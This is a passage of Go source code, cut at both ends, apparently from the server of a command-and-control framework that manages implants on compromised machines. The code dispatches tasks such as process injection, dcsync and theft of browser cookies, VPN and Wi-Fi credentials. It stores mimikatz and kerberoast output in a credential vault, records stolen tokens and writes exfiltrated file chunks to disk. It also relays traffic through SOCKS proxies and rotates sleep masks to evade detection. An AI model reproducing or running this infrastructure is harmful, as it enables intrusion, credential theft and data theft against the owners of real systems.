				AgentHost: agent.Hostname,
				AgentIP:   agent.IP,
				Timestamp: now,
				Data:      map[string]interface{}{"source": "creds_dump"},
			})
		}

		// Auto-parse mimikatz results into the credential vault
		if r.Type == "mimikatz" && task.Status == "completed" && task.Result != "" {
			parseAndStoreCredentials(s.db, uuid, task.Result, task.ID)
			s.eventManager.Emit(Event{
				Type:      EventCredentialFound,
				AgentID:   uuid,
				AgentHost: agent.Hostname,
				AgentIP:   agent.IP,
				Timestamp: now,
				Data:      map[string]interface{}{"source": "mimikatz"},
			})
		}

		// Auto-parse kerberoast TGS hashes into the credential vault
		if r.Type == "kerberoast" && task.Status == "completed" && task.Result != "" {
			parseAndStoreKerberoastResults(s.db, uuid, task.Result, task.ID)
			s.eventManager.Emit(Event{
				Type:      EventCredentialFound,
				AgentID:   uuid,
				AgentHost: agent.Hostname,
				AgentIP:   agent.IP,
				Timestamp: now,
				Data:      map[string]interface{}{"source": "kerberoast"},
			})
		}

		// Enforce max result size only for text results (not for images like screenshots)
		if r.Type != "screenshot" && len(task.Result) > MaxResultSize {
			task.Result = truncateString(task.Result, MaxResultSize)
		}
		if err := s.db.Model(task).Updates(map[string]interface{}{
			"status":      task.Status,
			"result":      task.Result,
			"error":       task.Error,
			"progress":    task.Progress,
			"total_bytes": task.TotalBytes,
			"transferred": task.Transferred,
		}).Error; err != nil {
			slog.Error("Failed to save task result", "task_id", task.ID, "agent_id", uuid, "type", r.Type, "error", err)
		}
		if !isSilent {
			s.broadcastTaskUpdate(uuid, *task)
		}

		// Task callbacks: POST results to external URL when task completes.
		// Uses a semaphore to bound concurrent background goroutines.
		if task.CallbackURL != "" && !task.CallbackSent {
			s.wg.Add(1)
			go func() {
				s.taskWorkerSem <- struct{}{}
				defer func() { <-s.taskWorkerSem }()
				defer s.wg.Done()
				defer func() {
					if r := recover(); r != nil {
						slog.Error("Task callback panicked", "task_id", task.ID, "recover", r)
					}
				}()
				s.executeTaskCallback(*task, uuid)
			}()
		}

		if s.pluginManager != nil {
			s.wg.Add(1)
			go func() {
				s.taskWorkerSem <- struct{}{}
				defer func() { <-s.taskWorkerSem }()
				defer s.wg.Done()
				defer func() {
					if r := recover(); r != nil {
						slog.Error("Plugin hook panicked", "agent_id", uuid, "recover", r)
					}
				}()
				ctx, cancel := context.WithTimeout(s.ctx, PluginHookTimeout)
				defer cancel()
				s.pluginManager.ExecuteHook(ctx, plugin.Event{
					Type:      plugin.EventTaskCompleted,
					Timestamp: now,
					AgentID:   uuid,
					Payload: map[string]interface{}{
						"task_id":   task.ID,
						"task_type": task.Type,
						"status":    task.Status,
						"error":     task.Error,
					},
				})
			}()
		}

		// ── Token vault: persist steal/make results ───────────────────────────
		if r.Error == "" && task.Result != "" {
			switch r.Type {
			case "token_steal", "token_make", "token_revert", "rev2self":
				s.wg.Add(1)
				go func() {
					s.taskWorkerSem <- struct{}{}
					defer func() { <-s.taskWorkerSem }()
					defer s.wg.Done()
					defer func() {
						if r := recover(); r != nil {
							slog.Error("Token result processor panicked", "agent_id", uuid, "recover", r)
						}
					}()
					s.processTokenResult(uuid, r.Type, task.Result)
				}()
			}
		}

		if (r.Type == "shell" || r.Type == "ps") && (r.Output != "" || r.Error != "" || task.Command != "") {
			cmdStr := task.Command
			if cmdStr == "" {
				cmdStr = r.Type
			}
			resultStr := r.Output
			if r.Encoding == "base64" && r.Output != "" {
				if decoded, err := base64.StdEncoding.DecodeString(r.Output); err == nil {
					resultStr = string(decoded)
				}
			}
			if r.Error != "" {
				resultStr = "ERROR: " + r.Error
			}
			if len(resultStr) > AuditLogResultMaxLen {
				resultStr = resultStr[:AuditLogResultMaxLen] + "..."
			}
			details := fmt.Sprintf("cmd: %s | result: %s", cmdStr, resultStr)
			if len(details) > AuditLogDetailsMaxLen {
				details = details[:AuditLogDetailsMaxLen] + "..."
			}
			pendingAudit = append(pendingAudit, auditEntry{action: "command_result", resource: "agent", agentID: uuid, details: details, success: r.Error == ""})
		}

		if r.Type == "upload" && r.Output != "" {
			if saveFileChunk(s, uuid, task, r, "upload", "File chunk saved") {
				continue
			}
		}

		if r.Type == "download" && r.Output != "" && (r.Offset > 0 || task.Offset > 0 || r.Size > 0) {
			if saveFileChunk(s, uuid, task, r, "download", "Download chunk saved") {
				continue
			}
		}
	}
}

func (s *Server) processTaskAcknowledgements(agentID string, taskIDs []uint, now time.Time) {
	if len(taskIDs) == 0 {
		return
	}
	unique := make([]uint, 0, len(taskIDs))
	seen := make(map[uint]struct{}, len(taskIDs))
	for _, taskID := range taskIDs {
		if taskID == 0 {
			continue
		}
		if _, ok := seen[taskID]; ok {
			continue
		}
		seen[taskID] = struct{}{}
		unique = append(unique, taskID)
	}
	if len(unique) == 0 {
		return
	}
	if err := s.db.Model(&db.Task{}).
		Where("id IN ? AND agent_id = ? AND status = ? AND acknowledged_at IS NULL", unique, agentID, "running").
		Update("acknowledged_at", now).Error; err != nil {
		slog.Error("Failed to acknowledge agent tasks", "agent_id", agentID, "count", len(unique), "error", err)
	}
}

func (s *Server) processRelayedResults(relayed []relayedData, parentUUID string, now time.Time) {
	// Batch-load all tasks referenced by any relayed child
	relayTaskIDs := make([]uint, 0, len(relayed)*2)
	relayTaskIDSet := make(map[uint]struct{})
	for _, rd := range relayed {
		for _, r := range rd.Results {
			if r.TaskID > 0 {
				if _, ok := relayTaskIDSet[r.TaskID]; !ok {
					relayTaskIDs = append(relayTaskIDs, r.TaskID)
					relayTaskIDSet[r.TaskID] = struct{}{}
				}
			}
		}
	}
	var relayedTasks []db.Task
	if len(relayTaskIDs) > 0 {
		if err := s.db.Where("id IN ?", relayTaskIDs).Limit(len(relayTaskIDs)).Find(&relayedTasks).Error; err != nil {
			slog.Error("Failed to batch-load relayed tasks", "error", err)
		}
	}
	relayTaskMap := make(map[uint]*db.Task, len(relayedTasks))
	for i := range relayedTasks {
		relayTaskMap[relayedTasks[i].ID] = &relayedTasks[i]
	}

	childIDs := make([]string, 0, len(relayed))
	childAgentMap := make(map[string]*db.Implant, len(relayed))

	for _, rd := range relayed {
		childIDs = append(childIDs, rd.AgentID)
	}
	if len(childIDs) > 0 {
		var childAgents []db.Implant
		if err := s.db.Where("id IN ? AND parent_id = ?", childIDs, parentUUID).Limit(len(childIDs)).Find(&childAgents).Error; err != nil {
			slog.Error("Failed to batch-load relayed child agents", "parent", parentUUID, "error", err)
		}
		childAgentMap = make(map[string]*db.Implant, len(childAgents))
		for i := range childAgents {
			childAgentMap[childAgents[i].ID] = &childAgents[i]
		}
	}

	for _, rd := range relayed {
		if _, ok := childAgentMap[rd.AgentID]; !ok {
			slog.Warn("P2P relay from non-child agent", "parent", parentUUID, "child", rd.AgentID)
			continue
		}
		s.processTaskAcknowledgements(rd.AgentID, rd.AckTaskIDs, now)
		for _, r := range rd.Results {
			task, ok := relayTaskMap[r.TaskID]
			if !ok || !strings.EqualFold(task.AgentID, rd.AgentID) {
				continue
			}
			task.Status = "completed"
			if r.Error != "" {
				task.Status = "failed"
				task.Error = r.Error
			}
			task.UpdatedAt = now

			// Decrement per-agent pending task counter
			s.agentPendingTasksMu.Lock()
			if s.agentPendingTasks[rd.AgentID] > 0 {
				s.agentPendingTasks[rd.AgentID]--
			}
			s.agentPendingTasksMu.Unlock()
			if r.Encoding == "base64" && r.Output != "" {
				decoded, err := base64.StdEncoding.DecodeString(r.Output)
				if err == nil {
					task.Result = string(decoded)
				} else {
					task.Result = r.Output
				}
			} else {
				task.Result = r.Output
			}
			if len(task.Result) > MaxResultSize {
				task.Result = truncateString(task.Result, MaxResultSize)
			}
			if err := s.db.Save(task).Error; err != nil {
				slog.Error("Failed to save relayed task result", "task_id", task.ID, "child", rd.AgentID, "error", err)
			}
			s.broadcastTaskUpdate(rd.AgentID, *task)
			slog.Info("P2P relayed task result processed", "child", rd.AgentID, "task_id", r.TaskID)
		}
		slog.Info("P2P relayed data processed for child", "parent", parentUUID, "child", rd.AgentID)
	}

	if len(childIDs) > 0 {
		if err := s.db.Model(&db.Implant{}).Where("id IN ?", childIDs).Update("last_seen", now).Error; err != nil {
			slog.Error("Failed to batch-update child agent last_seen", "parent", parentUUID, "error", err)
		}
	}
}

func (s *Server) fetchPendingTasks(uuid string, limits ...int) []task {
	var claimedTasks []db.Task
	limit := BeaconTaskFetchLimit
	if len(limits) > 0 && limits[0] >= 0 && limits[0] < limit {
		limit = limits[0]
	}
	if limit == 0 {
		return nil
	}

	// Claim and return exactly the same rows. Querying all running tasks after
	// an update can re-dispatch tasks claimed by an earlier beacon.
	if err := s.db.Transaction(func(tx *gorm.DB) error {
		var pending []db.Task
		if err := tx.Clauses(clause.Locking{Strength: "UPDATE"}).
			Where("agent_id = ? AND status = ?", uuid, "pending").
			Order("priority DESC, created_at ASC").
			Limit(limit).
			Find(&pending).Error; err != nil {
			return err
		}
		if len(pending) == 0 {
			return nil
		}

		ids := make([]uint, len(pending))
		for i, pendingTask := range pending {
			ids[i] = pendingTask.ID
		}
		result := tx.Model(&db.Task{}).
			Where("id IN ? AND status = ?", ids, "pending").
			Updates(map[string]interface{}{
				"status":     "running",
				"claimed_by": uuid,
				"claimed_at": time.Now(),
			})
		if result.Error != nil {
			return result.Error
		}
		if result.RowsAffected != int64(len(ids)) {
			return fmt.Errorf("task claim conflict for agent %s", uuid)
		}
		return tx.Where("id IN ?", ids).Order("priority DESC, created_at ASC").Find(&claimedTasks).Error
	}); err != nil {
		slog.Error("Failed to claim pending tasks", "agent_id", uuid, "error", err)
	}

	slog.Info("Beacon fetching pending tasks", "agent_id", uuid, "pending_count", len(claimedTasks))

	tasks := make([]task, len(claimedTasks))
	for i, t := range claimedTasks {
		wire := task{
			ID:      t.ID,
			Type:    t.Type,
			Command: t.Command,
			Shell:   t.Shell,
			Path:    t.Path,
			Data:    t.Data,
			Offset:  t.Offset,
			Size:    t.Size,
			PrevMAC: t.PrevMAC,
			MAC:     t.MAC,
		}
		encryptTaskPayload(s, uuid, &wire)
		tasks[i] = wire
	}
	return tasks
}

// sensitiveTaskTypes are task types whose Command/Data fields can carry
// secrets or code and are therefore encrypted at dispatch time (in addition
// to the transport envelope) with the session key, bound to (agent, task).
var sensitiveTaskTypes = map[string]bool{
	"shell": true, "ps": true, "powerpick": true,
	"inject": true, "shinject": true, "spawn": true, "shspawn": true,
	"peloader": true, "bof": true,
	"mimikatz": true, "creds": true, "kerberoast": true, "dcsync": true, "lsa_bypass": true,
	"download_url": true, "upload": true,
	"cookie_export": true, "vpn_creds": true, "wifi_creds": true,
}

// encryptTaskPayload encrypts sensitive task Command/Data fields with the
// agent's session key, bound to agentID||taskID. Fields that fail to encrypt
// are delivered in clear (the transport envelope still protects them); the
// session exists on this path, so failures indicate a real problem worth
// logging rather than dropping the task.
func encryptTaskPayload(s *Server, agentID string, wire *task) {
	if !sensitiveTaskTypes[wire.Type] || s.sessionManager == nil {
		return
	}
	aad := []byte(agentID + "\x00" + strconv.FormatUint(uint64(wire.ID), 10))
	encrypted := false
	if wire.Command != "" {
		if ct, err := s.sessionManager.EncryptB64WithAAD(agentID, []byte(wire.Command), aad); err == nil {
			wire.Command = ct
			encrypted = true
		} else {
			slog.Error("Task command encryption failed", "agent_id", agentID, "task_id", wire.ID, "error", err)
		}
	}
	if wire.Data != "" {
		if ct, err := s.sessionManager.EncryptB64WithAAD(agentID, []byte(wire.Data), aad); err == nil {
			wire.Data = ct
			encrypted = true
		} else {
			slog.Error("Task data encryption failed", "agent_id", agentID, "task_id", wire.ID, "error", err)
		}
	}
	wire.Encrypted = encrypted
}

func (s *Server) fetchRelayedChildTasks(parentUUID string) []relayedTask {
	var children []db.Implant
	if err := s.db.Where("parent_id = ?", parentUUID).Limit(500).Find(&children).Error; err != nil {
		slog.Error("Failed to fetch child agents", "parent", parentUUID, "error", err)
	}
	if len(children) == 0 {
		return nil
	}

	childIDs := make([]string, 0, len(children))
	for _, c := range children {
		childIDs = append(childIDs, c.ID)
	}

	var claimedTasks []db.Task
	if err := s.db.Transaction(func(tx *gorm.DB) error {
		var pending []db.Task
		if err := tx.Clauses(clause.Locking{Strength: "UPDATE"}).
			Where("agent_id IN ? AND status = ?", childIDs, "pending").
			Order("priority DESC, created_at ASC").
			Limit(BeaconTaskFetchLimit).
			Find(&pending).Error; err != nil {
			return err
		}
		if len(pending) == 0 {
			return nil
		}
		ids := make([]uint, len(pending))
		for i, pendingTask := range pending {
			ids[i] = pendingTask.ID
		}
		if result := tx.Model(&db.Task{}).Where("id IN ? AND status = ?", ids, "pending").Updates(map[string]interface{}{
			"status": "running", "claimed_by": parentUUID, "claimed_at": time.Now(),
		}); result.Error != nil {
			return result.Error
		}
		return tx.Where("id IN ?", ids).Order("priority DESC, created_at ASC").Find(&claimedTasks).Error
	}); err != nil {
		slog.Error("Failed to batch claim child tasks", "parent", parentUUID, "error", err)
		return nil
	}

	// Group by agent_id
	tasksByAgent := make(map[string][]db.Task, len(childIDs))
	for _, t := range claimedTasks {
		agentID := strings.ToLower(t.AgentID)
		tasksByAgent[agentID] = append(tasksByAgent[agentID], t)
	}

	var relayed []relayedTask
	for _, child := range children {
		tasks := tasksByAgent[strings.ToLower(child.ID)]
		if len(tasks) == 0 {
			continue
		}
		rt := relayedTask{AgentID: child.ID}
		for _, t := range tasks {
			wire := task{
				ID:      t.ID,
				Type:    t.Type,
				Command: t.Command,
				Shell:   t.Shell,
				Path:    t.Path,
				Data:    t.Data,
				Offset:  t.Offset,
				Size:    t.Size,
			}
			// Child tasks travel inside the parent's response, so their
			// sensitive fields are encrypted with the CHILD's session key.
			if s.sessionManager != nil && s.sessionManager.HasSession(child.ID) {
				encryptTaskPayload(s, child.ID, &wire)
			}
			rt.Tasks = append(rt.Tasks, wire)
		}
		relayed = append(relayed, rt)
	}
	return relayed
}

func (s *Server) processSOCKSRelay(uuid string, socksData []socksFrame, resp *beaconResponse) {
	// Process relay data coming FROM the agent (includes rportfwd frames)
	if len(socksData) > 0 {
		s.processAgentSocksData(uuid, socksData)
		// Handle rportfwd response frames from agent
		for _, f := range socksData {
			if strings.HasPrefix(f.Action, "rportfwd_") {
				s.processRPortFwdData(uuid, f)
			}
		}
	}
	// Collect pending relay frames going TO the agent
	if frames := s.collectSocksFrames(uuid); len(frames) > 0 {
		resp.SocksFrames = frames
	}
	// Hint agent to use fast polling when SOCKS is active
	if s.hasActiveSocks(uuid) {
		resp.SocksFastMode = true
	}
}

// fireAgentConnectHook notifies plugins about an agent connection asynchronously.
func (s *Server) fireAgentConnectHook(agent db.Implant, isNew bool, now time.Time) {
	if s.pluginManager == nil {
		return
	}
	s.wg.Add(1)
	go func() {
		s.taskWorkerSem <- struct{}{}
		defer func() { <-s.taskWorkerSem }()
		defer s.wg.Done()
		defer func() {
			if r := recover(); r != nil {
				slog.Error("Plugin hook panicked (agent connect)", "agent_id", agent.ID, "recover", r)
			}
		}()
		ctx, cancel := context.WithTimeout(s.ctx, PluginHookTimeout)
		defer cancel()
		s.pluginManager.ExecuteHook(ctx, plugin.Event{
			Type:      plugin.EventAgentConnect,
			Timestamp: now,
			AgentID:   agent.ID,
			Payload: map[string]interface{}{
				"hostname": agent.Hostname,
				"ip":       agent.IP,
				"os":       agent.OS,
				"username": agent.Username,
				"new":      isNew,
			},
		})
	}()
}

// enforceKillDate injects a kill task when the agent's kill date has passed and no kill task
// is already pending. This ensures the agent self-destructs on its next execution cycle.
func (s *Server) enforceKillDate(agent db.Implant, resp *beaconResponse, now time.Time) {
	if agent.KillDate == nil || !now.After(*agent.KillDate) {
		return
	}
	for _, t := range resp.Tasks {
		if t.Type == "kill" {
			return
		}
	}
	killTask, err := s.createTask(agent.ID, "kill", "", "", "", "", 0, 0)
	if err != nil {
		slog.Error("Failed to create kill task for expired agent", "agent_id", agent.ID, "error", err)
		return
	}
	killTask.Status = "running"
	if err := s.db.Save(killTask).Error; err != nil {
		slog.Error("Failed to save kill task", "agent_id", agent.ID, "error", err)
		return
	}
	resp.Tasks = append(resp.Tasks, task{
		ID:   killTask.ID,
		Type: killTask.Type,
	})
}

// enforceKillSwitch attaches the fleet kill-switch broadcast to the beacon
// response while it is armed. The token is regenerated on every arm and its
// per-implant authentication tag is derived from the agent's registration key,
// so only the server that holds the key can order self-destruct (and old
// broadcasts cannot be replayed after a disarm).
func (s *Server) enforceKillSwitch(agent db.Implant, resp *beaconResponse) {
	armed, token := s.killSwitchState()
	if !armed || token == "" {
		return
	}
	regKey := s.deriveRegKey(agent.ID)
	if len(regKey) == 0 {
		return
	}
	ksKey := crypto.DeriveKillSwitchKey(regKey)
	if len(ksKey) == 0 {
		return
	}
	resp.KillSwitch = token
	resp.KillSwitchMAC = hex.EncodeToString(crypto.KillSwitchHMAC(ksKey, []byte(token)))
}

// beaconFingerprint returns a dedup key for a beacon request.
// beaconFingerprint returns a content-derived fingerprint for duplicate detection.
// It hashes the actual payload (results, SOCKS frames, acks, relayed data) so
// that beacons carrying different data are never mistaken for duplicates.
func beaconFingerprint(req beaconRequest) string {
	h := sha256.New()
	h.Write([]byte(req.UUID))
	for _, r := range req.Results {
		h.Write([]byte(r.Type))
		h.Write([]byte(strconv.FormatUint(uint64(r.TaskID), 10)))
		h.Write([]byte(r.Output))
		h.Write([]byte(r.Error))
		h.Write([]byte(r.Filename))
		h.Write([]byte(strconv.FormatInt(r.Size, 10)))
		h.Write([]byte(strconv.FormatInt(r.Offset, 10)))
		h.Write([]byte(r.Path))
	}
	for _, f := range req.SocksData {
		h.Write([]byte(strconv.FormatUint(f.ConnID, 10)))
		h.Write([]byte(f.Action))
		h.Write(f.Data)
	}
	for _, id := range req.AckTaskIDs {
		h.Write([]byte(strconv.FormatUint(uint64(id), 10)))
	}
	for _, rel := range req.Relayed {
		h.Write([]byte(rel.AgentID))
		for _, r := range rel.Results {
			h.Write([]byte(r.Type))
			h.Write([]byte(strconv.FormatUint(uint64(r.TaskID), 10)))
			h.Write([]byte(r.Output))
			h.Write([]byte(r.Error))
			h.Write([]byte(r.Filename))
		}
		for _, id := range rel.AckTaskIDs {
			h.Write([]byte(strconv.FormatUint(uint64(id), 10)))
		}
	}
	return req.UUID + ":" + hex.EncodeToString(h.Sum(nil))
}

// isDuplicateBeacon checks if this beacon was recently processed.
func (s *Server) isDuplicateBeacon(req beaconRequest) bool {
	if s.beaconDedupCache == nil {
		return false
	}
	fp := beaconFingerprint(req)
	if fp == "" {
		return false
	}
	s.beaconDedupMu.Lock()
	defer s.beaconDedupMu.Unlock()
	// Bounded cache: force eviction if too large (anti-memory-exhaustion)
	if len(s.beaconDedupCache) > MaxBeaconDedupEntries {
		now := time.Now()
		for k, t := range s.beaconDedupCache {
			if now.Sub(t) > BeaconDedupWindow {
				delete(s.beaconDedupCache, k)
			}
		}
	}
	if t, ok := s.beaconDedupCache[fp]; ok {
		if time.Since(t) < BeaconDedupWindow {
			return true
		}
	}
	s.beaconDedupCache[fp] = time.Now()
	return false
}

// isDuplicateResult reports whether this task result was already applied for
// this agent. Agent results carry a per-result id; re-sends after dropped
// frames arrive with a new envelope seq, so idempotency keys on (agent, rid).
func (s *Server) isDuplicateResult(agentID string, r taskResult) bool {
	if r.ResultID == "" {
		return false
	}
	key := agentID + "/" + r.ResultID
	s.resultDedupeMu.Lock()
	defer s.resultDedupeMu.Unlock()
	if s.resultDedupeCache == nil {
		s.resultDedupeCache = make(map[string]time.Time)
	}
	if t, ok := s.resultDedupeCache[key]; ok && time.Since(t) < BeaconDedupWindow {
		return true
	}
	if len(s.resultDedupeCache) > MaxBeaconDedupEntries {
		now := time.Now()
		for k, t := range s.resultDedupeCache {
			if now.Sub(t) > BeaconDedupWindow {
				delete(s.resultDedupeCache, k)
			}
		}
	}
	s.resultDedupeCache[key] = time.Now()
	return false
}

// processBeacon contains the core beacon logic (registration, result processing,
// task dispatch). It is shared between HTTP and TCP transports.
func (s *Server) processBeacon(req beaconRequest, publicIP string) beaconResponse {
	now := time.Now()

	// Dedup: skip recently processed identical beacons
	if s.isDuplicateBeacon(req) {
		slog.Warn("Duplicate beacon dropped", "agent_id", req.UUID)
		return beaconResponse{}
	}

	// Reject malformed agent IDs before any DB or filesystem use
	if !isValidAgentID(req.UUID) {
		slog.Warn("Beacon rejected: invalid agent ID", "agent_id", req.UUID)
		return beaconResponse{}
	}

	// Reject agents with protocol versions below minimum supported
	if req.ProtocolVersion != protocol.CurrentProtocolVersion {
		slog.Warn("Agent protocol version mismatch, rejecting",
			"agent_id", req.UUID, "agent_pv", req.ProtocolVersion, "expected_pv", protocol.CurrentProtocolVersion)
		return beaconResponse{}
	}

	agent, isNew := s.processAgentRegistration(req, publicIP, now)
	if agent.ID == "" {
		return beaconResponse{}
	}

	// Store agent protocol version for future task format selection
	if req.ProtocolVersion > 0 {
		s.db.Model(&agent).Update("protocol_version", req.ProtocolVersion)
	}

	// Wire agent environment threat score to adaptive OPSEC manager
	if s.opsecAdaptive != nil && agent.EnvThreatScore > 0 {
		for i := 0; i < agent.EnvThreatScore/20; i++ {
			s.opsecAdaptive.RecordIntegrityFailure(agent.ID)
		}
		if agent.EnvHoneypot {
			slog.Warn("Agent reports honeypot environment", "agent_id", agent.ID, "threat_score", agent.EnvThreatScore)
			s.opsecAdaptive.RecordIntegrityFailure(agent.ID)
		}
	}

	s.fireAgentConnectHook(agent, isNew, now)

	s.processTaskAcknowledgements(req.UUID, req.AckTaskIDs, now)
	s.processTaskResults(agent, req.Results, req.UUID, now)

	if len(req.Relayed) > 0 {
		s.processRelayedResults(req.Relayed, req.UUID, now)
	}

	taskLimit := BeaconTaskFetchLimit
	if req.TaskCapacity != nil && *req.TaskCapacity >= 0 && *req.TaskCapacity < taskLimit {
		taskLimit = *req.TaskCapacity
	}
	resp := beaconResponse{
		Tasks:           s.fetchPendingTasks(req.UUID, taskLimit),
		Relayed:         s.fetchRelayedChildTasks(req.UUID),
		ProtocolVersion: protocol.CurrentProtocolVersion,
	}

	s.enforceKillDate(agent, &resp, now)
	s.enforceKillSwitch(agent, &resp)
	s.processSOCKSRelay(req.UUID, req.SocksData, &resp)

	return resp
}

func (s *Server) saveScreenshot(dataDir, agentID string, taskID uint, b64Data string) {
	if s.IsScreenMonitoring(agentID) {
		return // do not retain files during live screen monitoring
	}
	if dataDir == "" {
		dataDir = "data"
	}
	base := filepath.Join(dataDir, "screenshots")
	dir := safeJoin(base, agentID)
	if dir == "" {
		slog.Error("Invalid agent ID for screenshot path", "agent_id", agentID)
		return
	}
	if err := os.MkdirAll(dir, 0700); err != nil {
		slog.Error("Failed to create screenshots dir", "agent_id", agentID, "error", err)
		return
	}
	data, err := base64.StdEncoding.DecodeString(b64Data)
	if err != nil {
		return
	}
	filename := fmt.Sprintf("screenshot_%d_%d.png", taskID, time.Now().Unix())
	filePath := safeJoin(dir, filename)
	if filePath == "" {
		slog.Error("Invalid screenshot filename", "filename", filename)
		return
	}
	if err := os.WriteFile(filePath, data, 0600); err != nil {
		slog.Error("Failed to save screenshot", "file", filename, "error", err)
	}
}

func (s *Server) handleServeScreenshot(c *gin.Context) {
	agentID := c.Param("agent_id")
	filename := c.Param("filename")

	// Validate screenshot extension to prevent serving arbitrary files
	ext := strings.ToLower(filepath.Ext(filename))
	if ext != ".png" && ext != ".jpg" && ext != ".jpeg" && ext != ".gif" && ext != ".webp" {
		c.String(http.StatusBadRequest, "invalid screenshot file type")
		return
	}

	screenshotRoot := filepath.Clean(filepath.Join(s.cfg.Server.DataDir, "screenshots"))
	requested := safeJoin(safeJoin(screenshotRoot, agentID), filename)
	if requested == "" {
		c.String(http.StatusBadRequest, "invalid path")
		return
	}

	serveFileSafe(c, requested, screenshotRoot, "")
}

// saveFileChunk handles writing a base64-encoded file chunk to disk for both
// upload and download task types. Returns true if the caller should continue
// to the next result (i.e. skip normal task-result processing).
func saveFileChunk(s *Server, uuid string, task *db.Task, r taskResult, logPrefix string, resultPrefix string) bool {
	uploadBase := safeJoin(filepath.Join(s.cfg.Server.DataDir, "uploads"), uuid)
	if uploadBase == "" {
		slog.Error("Invalid agent ID for upload path", "agent_id", uuid)
		task.Result = "ERROR: invalid agent id"
		if err := s.db.Save(task).Error; err != nil {
			slog.Error("Failed to save invalid agent id error", "task_id", task.ID, "error", err)
		}
		return true
	}
	if err := os.MkdirAll(uploadBase, 0700); err != nil {
		slog.Error("Failed to create uploads dir", "agent_id", uuid, "error", err)
	}
	filename := r.Filename
	if filename == "" {
		filename = fmt.Sprintf("file_%d", task.ID)
	}
	filePath := safeJoin(uploadBase, filename)
	if filePath == "" {
		task.Result = "ERROR: invalid filename (path traversal blocked)"
		if err := s.db.Save(task).Error; err != nil {
			slog.Error("Failed to save file path traversal error", "task_id", task.ID, "error", err)
		}
		return true
	}
	decoded, err := base64.StdEncoding.DecodeString(r.Output)
	if err != nil {
		task.Result = fmt.Sprintf("ERROR: base64 decode failed: %v", err)
		if len(task.Result) > MaxResultSize {
			task.Result = truncateString(task.Result, MaxResultSize)
		}
		if saveErr := s.db.Save(task).Error; saveErr != nil {
			slog.Error("Failed to save decode error", "task_id", task.ID, "error", saveErr)
		}
		return true
	}
	if len(decoded) > MaxTransferChunkSize {
		task.Result = fmt.Sprintf("ERROR: chunk too large (%d bytes, max %d)", len(decoded), MaxTransferChunkSize)
		if saveErr := s.db.Save(task).Error; saveErr != nil {
			slog.Error("Failed to save chunk size error", "task_id", task.ID, "error", saveErr)
		}
		slog.Warn("Oversized exfil chunk rejected", "agent_id", uuid, "task_id", task.ID, "size", len(decoded))
		return true
	}
	if err := s.verifyAndCommitChain(uuid, task.ID, r.MAC, decoded); err != nil {
		task.Result = fmt.Sprintf("ERROR: %v", err)
		if saveErr := s.db.Save(task).Error; saveErr != nil {
			slog.Error("Failed to save integrity error", "task_id", task.ID, "error", saveErr)
		}
		slog.Warn("File chunk integrity failure", "agent_id", uuid, "task_id", task.ID, "error", err)
		return true
	}
	f, ferr := os.OpenFile(filePath, os.O_CREATE|os.O_WRONLY, 0600)
	if ferr != nil {
		task.Result = fmt.Sprintf("ERROR: open file failed: %v", ferr)
		if len(task.Result) > MaxResultSize {
			task.Result = truncateString(task.Result, MaxResultSize)
		}
		if saveErr := s.db.Save(task).Error; saveErr != nil {
			slog.Error("Failed to save open file error", "task_id", task.ID, "error", saveErr)
		}
		return true
	}
	defer f.Close()
	off := r.Offset
	if off == 0 {
		off = task.Offset
	}
	if off > 0 {
		if _, err := f.Seek(off, 0); err != nil {
			task.Result = fmt.Sprintf("ERROR: seek failed: %v", err)
			if len(task.Result) > MaxResultSize {
				task.Result = truncateString(task.Result, MaxResultSize)
			}
			if err := s.db.Save(task).Error; err != nil {
				slog.Error("Failed to save "+logPrefix+" seek error", "task_id", task.ID, "error", err)
			}
			return true
		}
	}
	if _, err := f.Write(decoded); err != nil {
		task.Result = fmt.Sprintf("ERROR: write failed: %v", err)
		if len(task.Result) > MaxResultSize {
			task.Result = truncateString(task.Result, MaxResultSize)
		}
		if err := s.db.Save(task).Error; err != nil {
			slog.Error("Failed to save "+logPrefix+" write error", "task_id", task.ID, "error", err)
		}
		return true
	}
	task.Result = fmt.Sprintf("%s: %s offset %d (%d bytes)", resultPrefix, filename, off, r.Size)
	if len(task.Result) > MaxResultSize {
		task.Result = truncateString(task.Result, MaxResultSize)
	}
	if err := s.db.Save(task).Error; err != nil {
		slog.Error("Failed to save "+logPrefix+" success", "task_id", task.ID, "error", err)
	}
	slog.Info("File chunk "+logPrefix, "agent_id", uuid, "file", filename, "offset", off, "size", r.Size)
	return false
}

// safeJoin verifies that joining base+name stays within base, preventing path traversal.
// autoSwitchSleepMask rotates to a different sleep mask variant when integrity failure is detected.
// Output format: "sleep_mask_integrity_failure: mask=<name> page=<idx>"
func (s *Server) autoSwitchSleepMask(agentID string, output string) {
	slog.Error("Sleep mask integrity failure — auto-switching variant", "agent_id", agentID, "output", output)

	// Parse the current mask name from the alert output
	currentMask := ""
	if idx := strings.Index(output, "mask="); idx >= 0 {
		rest := output[idx+5:]
		if end := strings.IndexByte(rest, ' '); end >= 0 {
			currentMask = rest[:end]
		} else {
			currentMask = rest
		}
	}

	// Rotation order: advanced → zilean → foliage → advanced
	var nextMask string
	switch currentMask {
	case "advanced":
		nextMask = "zilean"
	case "zilean":
		nextMask = "foliage"
	case "foliage":
		nextMask = "advanced"
	default:
		nextMask = "advanced"
	}

	// Create a set_sleep_mask task for the agent with high priority
	t, err := s.createTask(agentID, "set_sleep_mask", nextMask, "", "", "", 0, 0)
	if err != nil {
		slog.Error("Failed to create auto-switch sleep mask task", "agent_id", agentID, "error", err)
		return
	}
	t.Priority = 2
	if err := s.db.Save(t).Error; err != nil {
		slog.Error("Failed to save auto-switch sleep mask task", "agent_id", agentID, "error", err)
		return
	}

	s.LogAuditRecord(nil, "auto_switch_sleep_mask", "agent", agentID,
		fmt.Sprintf("Auto-switched sleep mask from %s to %s due to integrity failure", currentMask, nextMask), true, nil)

	slog.Warn("Auto-switched sleep mask", "agent_id", agentID, "from", currentMask, "to", nextMask)
}

// Returns empty string if the path escapes the base directory.
func safeJoin(base, name string) string {
	cleanBase := filepath.Clean(base)
	target := filepath.Clean(filepath.Join(cleanBase, name))
	if !strings.HasPrefix(target, cleanBase+string(filepath.Separator)) && target != cleanBase {
		return ""
	}
	return target
}

func isPrivateIP(ip string) bool {
	if ip == "" || ip == "::1" {
		return true
	}
	if strings.HasPrefix(ip, "127.") || ip == "localhost" {
		return true
	}
	if strings.HasPrefix(ip, "10.") {
		return true
	}
	if strings.HasPrefix(ip, "192.168.") {
		return true
	}
	if strings.HasPrefix(ip, "169.254.") {
		return true
	}
	// 100.64.0.0/10 (CGNAT)
	parsed := net.ParseIP(ip)
	if parsed != nil && parsed.To4() != nil {
		b := parsed.To4()
